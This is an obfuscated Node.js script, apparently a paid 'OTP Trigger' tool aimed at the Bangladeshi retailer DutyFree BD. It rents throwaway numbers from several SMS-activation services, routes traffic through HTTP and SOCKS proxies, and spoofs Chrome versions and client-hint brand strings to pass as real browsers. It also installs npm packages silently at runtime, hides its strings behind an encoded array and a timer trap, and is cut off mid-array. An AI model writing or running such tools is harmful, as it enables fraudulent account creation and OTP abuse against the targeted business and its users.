const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v13) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const v14 = {};
      v14.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v14), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v15) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed."), process.exit(0x1);
    }
  }
}
const http = require("http"),
  https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk");
const readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
function debugLog(v16, v17, v18) {}
const B = chalk.hex("#00A86B"),
  C = chalk.hex("#FFD700"),
  Y = chalk.hex("#FF6B35"),
  W = chalk.white;
const G = chalk.gray,
  R = chalk.hex("#FF4466"),
  DIM = chalk.hex("#555555");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("  ██████╗ ██╗   ██╗████████╗██╗   ██╗"));
    console.log(B("  ██╔══██╗██║   ██║╚══██╔══╝╚██╗ ██╔╝"));
    console.log(C("  ██║  ██║██║   ██║   ██║    ╚████╔╝ "));
    console.log(C("  ██║  ██║██║   ██║   ██║     ╚██╔╝  "));
    console.log(Y("  ██████╔╝╚██████╔╝   ██║      ██║   "));
    console.log(Y("  ╚═════╝  ╚═════╝    ╚═╝      ╚═╝   \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("DutyFree BD — OTP Trigger    ") + W('│'));
    console.log(W("│ [•] Version   : ") + B("DTFREE-V1.0.0                ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v19) {
    this.delayMs = v19, this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v20) {
    return new Promise((v21, v22) => {
      this.queue.push(async () => {
        try {
          v21(await v20());
        } catch (v23) {
          v22(v23);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v24 = this.queue.shift();
      await v24(), await new Promise(v25 => setTimeout(v25, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v26) {
  return new Promise((v27, v28) => {
    const v29 = {};
    v29.Accept = "text/plain", v29.Connection = "close";
    const v30 = {};
    v30.hostname = "smsbower.page", v30.port = 0x1bb, v30.path = "/stubs/handler_api.php?" + v26, v30.method = "GET";
    v30.headers = v29;
    const v31 = v30,
      v32 = https.request(v31, v33 => {
        let v34 = '';
        v33.on("data", v35 => v34 += v35), v33.on("end", () => v27(v34.trim()));
      });
    v32.on("error", v36 => v28(new Error("SmsBower net: " + v36.message))), v32.setTimeout(0x3a98, () => {
      v32.destroy();
      v28(new Error("SmsBower timeout"));
    }), v32.end();
  });
}
function smsBowerFetchNumber(v37, v38, v39, v40) {
  let v41 = "api_key=" + encodeURIComponent(v37) + "&action=getNumber&service=" + encodeURIComponent(v38 || 'fb');
  if (v39 && String(v39).trim() !== '0' && String(v39).trim() !== '') v41 += "&country=" + encodeURIComponent(v39);
  if (v40 && parseFloat(v40) > 0x0) v41 += "&maxPrice=" + encodeURIComponent(v40);
  return smsBowerRequest(v41).then(v42 => {
    if (v42.startsWith("ACCESS_NUMBER:")) {
      const v43 = v42.split(':');
      return {
        'activationId': v43[0x1],
        'phoneNumber': v43[0x2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v42);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v44, v45) {
  return new Promise((v46, v47) => {
    const v48 = {};
    v48.range = v45;
    v48.is_national = false, v48.remove_plus = false;
    const v49 = JSON.stringify(v48),
      v50 = {
        'hostname': "api.zenexnetwork.com",
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v44,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v49)
        }
      },
      v51 = https.request(v50, v52 => {
        let v53 = '';
        v52.on("data", v54 => v53 += v54), v52.on("end", () => {
          try {
            const v55 = JSON.parse(v53);
            if (v55?.["meta"]?.["code"] === 0xc8 && v55?.["data"]?.["full_number"]) v46(v55.data.full_number.replace(/[^0-9]/g, ''));else v47(new Error(v55?.["message"] || "Zenex: no number"));
          } catch (v56) {
            v47(new Error("Zenex: invalid JSON"));
          }
        });
      });
    v51.on("error", v57 => v47(new Error("Zenex net: " + v57.message))), v51.setTimeout(0x3a98, () => {
      v51.destroy();
      v47(new Error("Zenex timeout"));
    }), v51.write(v49), v51.end();
  });
}
(function () {
  let v58;
  try {
    const v59 = Function('return (function() {}.constructor("return this")( ));');
    v58 = v59();
  } catch (v60) {
    v58 = window;
  }
  v58.setInterval(fn2, 0xdac);
})();
function stripRid(v61) {
  return v61.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v62, v63, v64) {
  return new Promise((v65, v66) => {
    const v67 = JSON.stringify({
        'rid': stripRid(v63)
      }),
      v68 = {
        'hostname': "api.2oo9.cloud",
        'port': 0x1bb,
        'path': v64,
        'method': "POST",
        'headers': {
          'mauthapi': v62,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v67)
        }
      },
      v69 = https.request(v68, v70 => {
        let v71 = '';
        v70.on("data", v72 => v71 += v72);
        v70.on("end", () => {
          try {
            const v73 = JSON.parse(v71);
            if (v73?.["meta"]?.["code"] === 0xc8 && v73?.["data"]?.["no_plus_number"]) v65(v73.data.no_plus_number);else v66(new Error(v73?.["message"] || v73?.["meta"]?.["status"] || "2oo9: No number"));
          } catch (v74) {
            v66(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v69.on("error", v75 => v66(new Error("2oo9 network: " + v75.message))), v69.setTimeout(0x2710, () => {
      v69.destroy();
      v66(new Error("2oo9: Timeout"));
    });
    v69.write(v67), v69.end();
  });
}
function twoOoFetchConsole(v76, v77) {
  return new Promise((v78, v79) => {
    const v80 = {};
    v80.mauthapi = v76;
    const v81 = {};
    v81.hostname = "api.2oo9.cloud", v81.port = 0x1bb, v81.path = v77;
    v81.method = "GET", v81.headers = v80;
    const v82 = v81,
      v83 = https.request(v82, v84 => {
        let v85 = '';
        v84.on("data", v86 => v85 += v86);
        v84.on("end", () => {
          try {
            const v87 = JSON.parse(v85);
            if (v87?.["meta"]?.["code"] === 0xc8 && Array.isArray(v87?.["data"]?.["hits"])) v78(v87.data.hits);else v79(new Error(v87?.["message"] || "Console fetch failed"));
          } catch (v88) {
            v79(new Error("Console: Invalid JSON"));
          }
        });
      });
    v83.on("error", v89 => v79(new Error("Console network: " + v89.message))), v83.setTimeout(0x2710, () => {
      v83.destroy();
      v79(new Error("Console timeout"));
    });
    v83.end();
  });
}
function parseTwoOoRangeSelection(v90, v91) {
  const v92 = new Set(),
    v93 = v90.split(/[\s,]+/).filter(v94 => v94);
  for (const v95 of v93) {
    const v96 = v95.match(/^(\d+)-(\d+)$/);
    if (v96) for (let v97 = +v96[0x1]; v97 <= +v96[0x2]; v97++) {
      if (v97 >= 0x1 && v97 <= v91) v92.add(v97 - 0x1);
    } else {
      const v98 = parseInt(v95);
      if (!isNaN(v98) && v98 >= 0x1 && v98 <= v91) v92.add(v98 - 0x1);
    }
  }
  return [...v92].sort((v99, v100) => v99 - v100);
}
async function autoRangeFinderFor2Oo(v101, v102, v103, v104) {
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v105 = [];
  try {
    v105 = await twoOoFetchConsole(v101, v102);
  } catch (v112) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v112.message + '\x0a')), null;
  }
  const v106 = v105.slice(0x0, 0x64);
  if (v106.length === 0x0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v107 = {};
  for (const v113 of v106) {
    const v114 = v113.range || '';
    if (!v114) continue;
    v107[v114] = (v107[v114] || 0x0) + 0x1;
  }
  const v108 = Object.entries(v107).sort((v115, v116) => v116[0x1] - v115[0x1]).slice(0x0, 0x5);
  if (v108.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v109 = {};
  v109.name = "⚡ Auto detect & send (#1 range)", v109.value = "auto";
  const v110 = {};
  v110.name = "📊 Show top 5 & select", v110.value = "select";
  const v111 = await v103("Range Finder mode:", [v109, v110]);
  if (v111 === "auto") {
    const [v117, v118] = v108[0x0];
    return console.log(chalk.green("\n  ✓ Auto Range: " + v117 + "  (" + v118 + " hits)\n")), [v117];
  } else {
    console.log(chalk.cyan("\n  Scanned: " + v106.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits")), console.log(chalk.gray("  ─".repeat(0x16))), v108.forEach(([v122, v123], v124) => {
      console.log(chalk.cyan('\x20\x20' + String(v124 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v122.padEnd(0x10)) + chalk.yellow(String(v123).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v123, 0xc))));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v119 = await v104("Select ranges:", ''),
      v120 = parseTwoOoRangeSelection(v119, v108.length);
    if (v120.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v121 = v120.map(v125 => v108[v125][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v121.join(',\x20') + '\x0a')), v121;
  }
}
function nexaFetchNumber(v126, v127, v128) {
  return new Promise((v129, v130) => {
    const v131 = {};
    v131.range = v127, v131.format = "normal";
    const v132 = JSON.stringify(v131),
      v133 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v128 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v126,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v132)
        }
      };
    const v134 = require("http").request(v133, v135 => {
      let v136 = '';
      v135.on("data", v137 => v136 += v137), v135.on("end", () => {
        try {
          const v138 = JSON.parse(v136);
          if (v138.success && v138.number) v129(v138.number.replace(/[^0-9]/g, ''));else v130(new Error(v138.error || "NexaOTP: No number returned"));
        } catch (v139) {
          v130(new Error("NexaOTP: Invalid response"));
        }
      });
    });
    v134.on("error", v140 => v130(new Error("NexaOTP network: " + v140.message))), v134.setTimeout(0x2710, () => {
      v134.destroy();
      v130(new Error("NexaOTP: Timeout"));
    }), v134.write(v132), v134.end();
  });
}
function normalizeBDPhone(v141) {
  let v142 = String(v141).trim().replace(/[^0-9]/g, '');
  if (v142.startsWith("880") && v142.length === 0xd) v142 = '0' + v142.slice(0x3);
  if (!v142.startsWith('0')) v142 = '0' + v142;
  return v142;
}
const v1 = {};
v1.v = 0x80, v1.buildMin = 0x19d5, v1.buildMax = 0x1a0b, v1.grease = "\"Not;A=Brand\";v=\"8\"";
const v2 = {};
v2.v = 0x82, v2.buildMin = 0x1a43, v2.buildMax = 0x1a79, v2.grease = "\"Not?A_Brand\";v=\"99\"";
const v3 = {};
v3.v = 0x84, v3.buildMin = 0x1ab2, v3.buildMax = 0x1b1e, v3.grease = "\"Not A(Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x86, v4.buildMin = 0x1b56;
v4.buildMax = 0x1b88, v4.grease = "\"Not;A)Brand\";v=\"24\"";
const v5 = {};
v5.v = 0x88, v5.buildMin = 0x1bbf, v5.buildMax = 0x1bee, v5.grease = "\"Not=A_Brand\";v=\"99\"";
const v6 = {};
v6.v = 0x8a, v6.buildMin = 0x1c24, v6.buildMax = 0x1c59, v6.grease = "\"Not)A;Brand\";v=\"99\"";
const v7 = {};
v7.v = 0x8c, v7.buildMin = 0x1c7e, v7.buildMax = 0x1c9f, v7.grease = "\"Not=A?Brand\";v=\"8\"";
const v8 = {};
v8.v = 0x8e, v8.buildMin = 0x1cbf, v8.buildMax = 0x1ce2, v8.grease = "\"Not_A Brand\";v=\"8\"";
function fn1() {
  const v143 = ['Dgv4Dc9WBgfPBG', 'EMvUzxHFA2v5lNr4Da', 'l2fWAs92ms9UDw1IzxjZl3aYl2DLDa', 'yu5UBxu', 'sNDlu0m', 'DMXXDgC', 'yNL0zuXLBMD0Aa', 'CMvTB3zLtgLZDgvUzxi', 'z3PPCcWGzgvMBgf0zsWGyNiSihPZDgq', 'v2vlCvi', 'wMvUzxGGBMv0oIa', 'zw5KC1DPDgG', 'zMfPBgvK', 'DuTywwm', 'icbevvrziezsruuGqKqG4OcuifjfqurzifrpieXbvu5dscaGicaGicaGica', 'vxnLihnHDMvKigTLEq', 'vhjPz2DLCMvKie9uucbMB3iG', 'zw50CMLLCW', 'DxnLCI1Hz2vUDa', 'vufqrKS', 'mZntAxj6yuK', 'Aw5OzxjPDa', 'AgfZ', 'zgvSyxLnCW', 'CgfKu3rHCNq', 'Dg9tDhjPBMC', 'CMvUzgvY', 'y2f0y2G', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'zhLrA2m', 'u21ZqM93zxi6ia', 'B0v5u1G', 'teXws3i', 'v25NtMW', 'yNvPBgrnyxG', 'ndCYmdq0DhLuy0nn', 'vMnIueC', 'uu92Duy', 'CgLWzq', 'rgLYzwn0icHoBYbqCM94EsK', 'icdILzeGieHxsuqGica6ia', 'B3rWlxjLCW', 'tfbwtwO', 'AhvKB28', 'tM8SigvUDgvYig5LDYbRzxK', 'vwfOq3e', 'DMDAu0u', 'CgHVBMu', 'uhjVEhKGica', 'A0DYD3u', 'tfjIB0S', 'u291CMnLica', 'yM9Sza', 'v2zfweG', 'C2vJlwnOlxvHlw1VyMLSzq', 'iK5VDcLbo0jYyw5KiJT2psiYnci', 'yxHAwNi', 'z3jLyxnL', 'Agv4', 'icdILia', 'rxPgrey', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'CevZDvm', 'y29VA2LLCW', 'ExLIAxC', 'q29UC29Szsb0Aw1LB3v0', 'C3vJy2vZCW', 'wZiVmL0G4PYfie9uucbeAxnWyxrJAgvK', 'rhv0EsbgCMvLiejeie9uucbuCMLNz2vYicaGica', 'tMv4yu9uudOGvgLTzw91Da', 'v3HiAeu', 'tM8GAgfYzhDHCMuGzgf0yq', 'zhv0EwzYzwu', 'BhruChm', 'y29Uy2f0', 'Ahr0ChmTChjVEhKTywDLBNq', 'Dg9mB3DLCKnHC2u', 'C2vJlwzLDgnOlwrLC3q', 'CMv0CNK', 'Cwz3tfu', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'zxHPDa', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'igTLEsbMB3vUzcaO', 'suTbrei', 'C2XPy2u', 'ywn0Aw9U', 'DM9SDhHFA2v5lNr4Da', 'qu5lsu5hlq', 'sKXhq04', 'vwnIsxG', 'C2vJlwzLDgnOlxnPDgu', 'C2HHmJu2', 'uvbtrNK', 'nxWYFdz8mtb8m3W5Fdf8mtf8nhWXmNWWFdD8ohWXmW', 'lM5LEgfFyxbPx2TLEq', 'C2fTzs1VCMLNAw4', 'CLvpywe', 'AhzKD1G', 'z2DLCG', '8j+AQYboB25LicHeAxjLy3qGq29UBMvJDgLVBIK', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', '8j+uPsbbDxrVigzLDgnOigzYB20Gu3rLEcaOmM9VosK', 'C3rHDhvZ', 'yxv0BW', 'tLveAey', 'u2nYyxbLCIblAw5NicaGicaGicaGicaGicaGica', 'rNnXAK4', 'CxL1BxO', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTana', 'ufvhvvi', 'AxzrAfO', 'y3rYBa', 'BM93', 'Affbt20', 'C3rVCa', 'ANPkA08', 'Eev5t00', 'icdILze', 'zvfuq2i', 'uLj2zfq', 'icdILiZILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILja', 'q29Uy3vYCMvUDcb0AhjLywrZifTKzwzHDwX0oIaXnv06', 'y29UC29SzvbHDgG', 'Au1kvM0', 'C21ZyM93zxiUCgfNzq', 'jg1Nid0GkeDLDc1jDgvTuhjVCgvYDhKGj0Hlte06xfnprLrxqvjfxe1Py3jVC29MDfXdCNLWDg9NCMfWAhKNic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLks5nywnOAw5Lr3vPzdSG', 'Dg90ywXdB3vUDa', 'i0zgrdCWma', 'z01yEuC', 'u21ZqM93zxiGBMv0oIa', 'C2vZC2LVBG', 'uerSzwy', 'CKvwwKW', 'uw5YEwy', 'iokUNIa', 'l3yXl251Bxn1y2nLC3mVAw5MBW', 'Ag9ZDa', 'g1SYsHTBsa', 'D2HPBguGkhrYDwuPihT9', 'CMv0DxjU', 'uLHIzg8', 'C2vJlwnOlxvHlxbSyxrMB3jT', 'cLTtrvrvuf0GrMLYC3qGDgLTzsbZzxr1CdOGsw5ZDgfSBgLUzYbYzxf1AxjLzcbKzxbLBMrLBMnPzxmUlI4', 'u2HOveC', 'D3DotKm', 'icdILii', '8j+AGcbtDgfYDcbtzw5KAw5N', 'sg93ihrVihnLBgvJDcbYyw5Nzxm/', 'yK9mreS', 'jMfJDgLVBJ1NzxrtDgf0DxmMAwq9', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', 'zwvtt1i', 'qw1ZrKi', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'zgLNzxn0', 'sxHjswq', 'tw96AwXSys81lJaGkfDPBMrVD3mGtLqGmtaUmdSGv2LUnJq7ihG2ncKGqxbWBgvxzwjlAxqVntm3lJm2icHlsfrntcWGBgLRzsbhzwnRBYKGq2HYB21LlW', 'A0j2Dwy', 'icaG', 'CMvZB2X2zq', 'y2HHAw4', 'g1SWBqO', 'tu5Ttxa', 'r3HSChG', 'vw5RBM93BKnqvq', 'y3nYzLrVA2vU', 'EwrrzKe', 'yxbWBhK', 'vvrXvgG', 'icdILOJILOJILztILzdILzdILOJILOJILzFILOJILOJILzeGicdILOJILOJILzhILzRILzdILzdILOJILOJILztILzdILzdILz3ILzRILOJILOJILzCG4PAi4PAi4Pwu4PwD', 'uwD4re4', 'qwnJzxb0luvUy29KAw5N', 'Affxs1y', 'AfrNDKu', 'y2HPBgrFChjVy2vZCW', 'ueDzCgq', 'icdILjtILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILjGk', 'z3vUEMLWu3LUyW', 'DhjPBq', 'BMf2AwDHDgu', 'Dg9Rzw4', 'BwfUDwfS', 'icdINjCGsfDjrcbTAxnTyxrJAcbKDxjPBMCGzxHLy3v0Aw9UihnLCxvLBMnLlIbbyM9YDgLUzY4UlGO', 'C2LN', 'ChvZAa', 'zNzNDgi', 'Cg9YDa', 'icdILOJILOJILzeGiokwIokwIokvKEkwIokwIokvKsaGiokwIokwIokvKsaGiokwIokwIokvKsaGicdILzRILOJILOJILOJILOJILztILz0G', 'zgvSzxrL', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psy', 'cIaG4PYxieXPy2vUC2uGu2vYDMvYihrPBwvVDxqUiev4AxrPBMCUlI4k', 'DxbKyxrLx3jLCxvPCMvK', 'u0vmrunuifbst1HjrvmGrKLmrq', 'drTBsW', 'z3f2BeO', 'B2jQzwn0', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'qxzOrM4', 'sgjutMS', 'zM9YrwfJAa', 'yxbPlJjVBZKUy2XVDwq', 'Cg9W', 'Aw5JBhvKzxm', 'Cg9ltfu', 'u0vmrunuifrbuKDfvcbovu1crvjtiezjteu', 'BwvZC2fNzq', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 'CMfUz2vZ', 'CMXcree', 'C3rLEa', 'BNvTyMvYCY50Ehq', 'vvL3qLK', 'Bw9IAwXLx25Vpq', 'tMv4yu9uudOGtM8GBNvTyMvYihjLDhvYBMvK', 'iK5VDdTbkujYyw5KiJT2psiYnci', 'C29JA3m1oI8V', 'otC1ntqWCwr3surZ', 'ChjVy2vZC2vK', 'tK9uifjfr0LtvevsruqGlYbsru1pvKve', 'Ag9ZDg5HBwu', 'z3jLzw4', 'rerizMG', 'l2fWAs92ms9UDw1IzxjZl3aZl2DLDa', 'zMLSDgvY', 'Aw5WDxq', 'zgvIDwCUDhH0', 'y2fSBa', 'zg9JDw1LBNq', 'CgfYC2u', 'ugXczKO', 'y2D0sLG', 'wKfts0e', 'zMfPBgvKlNr4Da', 'C29JA3m1', 'tMv4yu9uudOGsw52ywXPzcbYzxnWB25Zzq', 'icdILzeGifn0yxr1CYa6ia', 'zNjVBq', 'rw50zxiGwMvUzxGGqvbjieTLEsaOBwfWAwTLEsK6', 'qwjgsuy', 'ls0Tls1cruDjtIbqvujmsumGs0vzls0Tls0ktunVD0jrwurlmLz3qxLfquLvn1bJnZvHBYTgBJDyr0m3A0zhzurOn0PbCZnVne5ttdjmz21omfLTzLK9cI0Tls0Tru5eifbvqKXjqYblrvKTls0Tlq', 'q2HcuLG', 'qwnJzxb0', 'y1vOtui', 'igHPDhmPcG', 'icdWN5QaieXbvu5dseLorYbevvrziezsruuGqKqGt1rqievor0Lorq', 'y3j5ChrV', 'zNvUy3rPB24GkLWOicPCkq', 'uezWzgq', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'EwfjD20', 'qKv3ELO', 'CgfHA2O', 'rw50zxiGuhjVEgLLCYbgAwXLifbHDgG6', 'Dg9gAxHLza', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'CMvHzgXPBMu', 'wMTMAu0', 'iK5VDdTbpujYyw5KiJT2psi4iG', 'C2DTvum', 'A2nmEM0', 'zKHOCNe', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'BeHAvKu', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'Bwf4', 'y3rVtee', '8j+mKcbbDxrVigzLDgnOigzYB20GtMv4yu9uucbqyw5LBa', 'wMvUzxGGA2v5igzVDw5KicG', 'BfDmEeC', 'zhPpB2G', 'wfLwzNa', 'cIaGu2nHBM5LzdOG', 'q29UBMvJDgLVBG', 'C3rHCNq', 'icdILOJILOJILzeGiokwIokwIokvKEkwIokwIokvKsaGiokwIokwIokvKsaGiokwIokwIokvKsaGicaG4PwA4PAi4PAi4Pwu4PwDica', 'w0vsuK9sxsbgywLSzwqGDg8GAw5ZDgfSBcbKzxbLBMrLBMnPzxmUie1HA2uGC3vYzsboB2rLlMPZigfUzcboue0GyxjLigLUC3rHBgXLzc4', 'icdILjZILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILkq', 'q291BNrYEsbJB2rLicGWid0Gyw55lcaZnIa9iejeksbBzgvMyxvSDdOGmZzDoG', 'zMXVB3i', 'yMfUBMvK', 'C3bSAxq', 'CMvXDwvZDa', 'rMfPBgvKicHivfrqia', 'Aw5PDa', 'ExvOu1y', 'C3rHCNrZv2L0Aa', 'ywnJzxb0lwXHBMD1ywDL', 'DxnLCG', 'iZaWqtG2qG', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'AxnFBMf0Aw9UywW', 'zxjYB3i', 'q2rZAhO', 'qu5TuMq', 'DuvVt0W', 'swjVy3y', 'Cxndsha', 'Ahr0Chm6lY9KDxr5zNjLzwjKlMnVBq', 'v3jPDguTt3v0Chv0icGOjg1NlcrJChuSjgrPC2SSjg1IksaTAM9PBIaNFcCPiG', '4PscifVIGkjDifrVB2WGicaGica6ia', 'wMHMDM8', 'cLTgqvrbtf0G', 'D3jPDgvgAwXLu3LUyW', 'veDQrvy', 'yNf1v0q', 'Cgf0Aa', 'BLvWEvi', 'icdILzeGienVBNrHy3q6ihqUBwuVC2nYyxbLCL9RAw5NihrVihjLz2LZDgvYicaGicdILze', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'u3rLEcdWN5sL', 'tgrPq2m', 'yK9Rufy', 'D29YA2vYx3rOCMvHzhm', 'uunby2G', 'DxnL', 'CgXHDgzVCM0', 'vhnzsuC', 'qLHuCfy', 'BLnwD0C', 'u0TjtKCT', 'q29UDgvUDc1mzw5NDgG', 't3jXzxi', 'BwHgtue', 'CMvMzxjLCG', 'zgvZDhjVEq', 'rw50zxiGtMv4yu9uucbbueKGs2v5icH0ExbLicDIywnRjYb0BYbJyw5JzwWPoG', 'Bwv0yq', 'u1LMy2G', '4PscifVIGkjDifzLCNnPB24Gica6ia', 'rMfPBgvKig9Uia', 'Bg9N', 'wffWEKS', 'rgDAzeu', 'rMf0ywWGzxjYB3iGB24G', 'Ehfmrfy', 'De1etwS', 'zKHMt3y', 'cIaGrw50zxiGC2vSzwn0Aw9UicHLlMCUideSmYb8ideGmIa1ihWGms0ZkqO', 'z3jHEq', 'cIaG4Pwu4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwx', 'A0DJCge', 'D1rbCu0', 'iK5VDf9biejYyw5KiJT2psi4iG', 's1r0v1C', 'DMvYAwz5', 'icdILOJILOJILOJILOJILOJILOJILzCG4PAi4PAi4PwxicaG4PAi4PAi4Pwx4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4Pwx4PAi4PAi4PwxicaG4PAi4PAi4Pwx', 'zerQzeW', 'ms4WlJa', 'zeLbAMK', 'DM9SDhG', 'yxHnwMW', 'y29UC3rYDwn0B3i', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'y29YCW', 'B0LfrLC', 'DwzHAM4', 'rw50zxiG', 'oti4mJrWD3H6Exe', 'DvrmD3e', 'DxrMoa', 'u1rbvfvtx0nbtKnfta', 'yMfZzty0', 'AwTpq0O', 'yxbPlNPLBMv4BMv0D29YAY5JB20', 'BNHhtfm', 'l2v0yY9TywnOAw5LlwLK', 'swDuCKO', 'u2f2zsbRzxK/', 'BwLU', 'rerSugy', 'EMXPyG', 'Bw9KzwW', 'DxbKyxrL', 'wujLsvO', 'y29VA2LL', 'yMfJAW', 'cIaG4PYxienssvrjq0fmifnfq1vssvrziefmrvjuoIbsDw50Aw1Lig1LBw9YEsbPBMPLy3rPB24Gzgv0zwn0zwqU', 'rezQEeq', 'jMfJDgLVBJ1NzxroDw1IzxiMC2vYDMLJzt0', 'run3vwm', 'yxbWx2LK', 'Dw5SAw5Ru3LUyW', 'uundsgC', 'vffYrvm', 'vgfYz2v0ica', 'C3bOEu8', 'C3rKAw8', 'rMfPBgvKihrVigzLDgnOig51BwjLCIbMCM9TihbYB3zPzgvY', 'iokCLYbty3jHCgvYieTPBMC', 'BxD5DKO', 'DgXwD1q', 